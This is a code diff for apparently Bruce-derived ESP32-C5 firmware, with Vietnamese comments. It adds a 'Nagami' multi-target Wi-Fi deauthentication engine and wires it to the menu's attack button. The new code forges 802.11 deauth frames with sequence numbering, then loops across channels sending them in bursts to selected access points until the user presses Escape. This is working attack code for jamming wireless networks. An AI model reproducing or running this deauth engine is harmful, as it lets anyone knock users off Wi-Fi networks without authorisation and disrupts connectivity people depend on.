@@ -273,7 +273,76 @@ bool wifi_atk_unsetWifi() {
 // --- ĐỘNG CƠ MULTI-DEAUTH ---
 
 
-// --- TÍNH NĂNG 1: DEAUTH TOP 5 RSSI ---
+// --- NAGAMI INJECT ENGINE FOR C5 ---
+static uint16_t nagami_seq = 0;
+
+void nagami_inject_packet(const uint8_t *bssid, const uint8_t *target, uint8_t channel) {
+    typedef struct {
+        uint8_t frame_ctrl[2];
+        uint8_t duration[2];
+        uint8_t da[6];
+        uint8_t sa[6];
+        uint8_t bssid[6];
+        uint8_t seq[2];
+        uint8_t reason[2];
+    } __attribute__((packed)) nagami_frame_t;
+
+    nagami_frame_t frame;
+    memset(&frame, 0, sizeof(frame));
+
+    frame.frame_ctrl[0] = 0xC0; // Deauth frame
+    frame.duration[0] = 0x3A; frame.duration[1] = 0x01;
+    
+    memcpy(frame.da, target, 6);
+    memcpy(frame.sa, bssid, 6);
+    memcpy(frame.bssid, bssid, 6);
+
+    // Quản lý Sequence Number (Lý do bản Bruce hay treo C5 vì thiếu cái này)
+    nagami_seq = (nagami_seq + 1) % 4096;
+    uint16_t seq_val = (nagami_seq << 4);
+    frame.seq[0] = seq_val & 0xFF;
+    frame.seq[1] = (seq_val >> 8) & 0xFF;
+    frame.reason[0] = 0x07; // Reason 7
+
+    // Gửi qua Interface STA (C5 ổn định nhất ở cổng này)
+    esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
+}
+
+// Logic điều khiển Multi-Deauth "Không bao giờ treo"
+void nagami_ultimate_multi_atk(const std::vector<wifi_ap_record_t>& targets) {
+    if (targets.empty()) return;
+    resetGlobalState();
+
+    // CHIÊU THỨC: Reset Stack để Radio sạch hoàn toàn (Học từ bản C thành công)
+    esp_wifi_stop();
+    vTaskDelay(pdMS_TO_TICKS(100));
+    esp_wifi_set_mode(WIFI_MODE_STA);
+    esp_wifi_start();
+
+    drawMainBorderWithTitle("Nagami C5 Engine");
+    
+    while (true) {
+        for (const auto &target : targets) {
+            // Nhảy kênh và đợi Radio C5 ổn định tần số (PLL Lock)
+            esp_wifi_set_channel(target.primary, WIFI_SECOND_CHAN_NONE);
+            vTaskDelay(pdMS_TO_TICKS(40)); 
+
+            // Bắn burst 10 gói nhưng có nghỉ cực ngắn giữa các gói
+            for (int i = 0; i < 10; i++) {
+                nagami_inject_packet(target.bssid, _default_target, target.primary);
+                vTaskDelay(pdMS_TO_TICKS(2)); // Tránh tràn buffer radio
+            }
+
+            if (check(EscPress)) break;
+            vTaskDelay(1); // Nhường CPU cho hệ thống
+        }
+        if (check(EscPress)) break;
+        vTaskDelay(pdMS_TO_TICKS(50)); // Nghỉ một nhịp giữa các vòng quét
+    }
+    
+    wifi_atk_unsetWifi();
+    returnToMenu = true;
+}
 
 
 // --- TÍNH NĂNG 2: MENU MULTI-SELECT ---
@@ -360,12 +429,13 @@ void multi_select_menu() {
         menu_strings.clear(); 
         
         // Nút Kích hoạt
-        options.push_back({">> START ATTACK <<", [&]() {
+        options.push_back({">> START NAGAMI ENGINE <<", [&]() { // Đổi tên nút cho oai
             std::vector<wifi_ap_record_t> selected;
             for(int i = 0; i < ap_records.size(); i++) {
                 if(multi_select_flags[i]) selected.push_back(ap_records[i]);
             }
-            if(!selected.empty()) execute_multi_deauth(selected);
+            // GỌI ENGINE MỚI Ở ĐÂY
+            if(!selected.empty()) nagami_ultimate_multi_atk(selected); 
         }});
 
         // Vẽ danh sách WiFi với dấu [X]
@@ -378,7 +448,7 @@ void multi_select_menu() {
             
             options.push_back({menu_strings.back().c_str(), [&, i]() {
                 multi_select_flags[i] = !multi_select_flags[i];
-                returnToMenu = true; // HIỆU ỨNG: Ép vẽ lại để hiện dấu [X] ngay
+                SelPress = false; // HIỆU ỨNG: Ép vẽ lại để hiện dấu [X] ngay
             }});
         }
 
